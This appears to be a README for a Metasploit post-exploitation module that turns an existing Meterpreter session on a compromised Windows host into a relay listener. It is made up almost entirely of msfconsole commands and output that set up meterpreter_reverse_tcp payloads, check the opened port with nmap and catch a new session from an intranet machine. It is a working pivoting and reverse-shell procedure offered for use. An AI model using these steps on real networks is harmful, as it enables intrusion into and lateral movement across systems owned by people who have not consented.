# session_handler
a post module of metasploit, bind handler in meterpreter session 

frist you need get a meretpreter session 
```bash
msf6 exploit(multi/handler) > sessions 

sessions
============

  Id  Name    Type                     Info           Connection
  --  ------    ------                     ------           ------
  1           meterpreter x86/windows  w-PC\w @ W-PC  192.168.56.1:4444 -> 192.168.56.102:49402 (192.168.56.102)
```




run  use exploit/multi/session_handler 
```bash

msf6 exploit(multi/handler) >   use exploit/multi/session_handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/session_handler) > options
msf6 exploit(multi/session_handler) > set lport  14444 
msf6 exploit(multi/session_handler) > set lhost 192.168.56.1 #local machine public address 
msf6 exploit(multi/session_handler) > set payload windows/x64/meterpreter_reverse_tcp 
msf6 exploit(multi/session_handler) > set session  1 #the meterpreter sessionid  
msf6 exploit(multi/session_handler) > run -j #as job
msf6 exploit(multi/session_handler) > jobs 

Jobs
====

  Id  name                           payload                          options
  --  ------                            ------------                           ------------------
  5   Exploit: multi/session_handler  linux/x64/meterpreter_reverse_tcp  tcp://192.168.56.1:14444
```


now ,you can see the port  14444 is binding in  192.168.56.102 (meterpreter session machine).

check port is open with nmap 

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-30 17:43 CST
Nmap scan report for 192.168.56.102
Host is up (0.00047s latency).

PORT      STATE SERVICE
14444/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.03 seconds
```




 execute windows/x64/meterpreter_reverse_tcp on other machine (The machine must have access to 192.168.56.102  ) , the you will be get a new meterpreter session from intranet host.

```bash
msf6 exploit(multi/session_handler) > [*] Meterpreter session 3 opened (192.168.56.1:14444 -> 192.168.56.1:40977) at 2022-07-30 17:32:46 +0800
msf6 exploit(multi/session_handler) > 
msf6 exploit(multi/session_handler) > sessions 
sessions
============

  Id  Nmae  Type                     Info                                                                    Connection
  --  ------    ------                     ------                                                                    ------
  1           meterpreter x86/windows  w-PC\w @ W-PC                                                           192.168.56.1:4444 -> 192.168.56.102:49402 (192.168.56.102)
  3           meterpreter x86/linux    w @ w-F117-V (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.168.1.12  192.168.56.1:14444 -> 192.168.56.1:40977 (192.168.56.1)
```
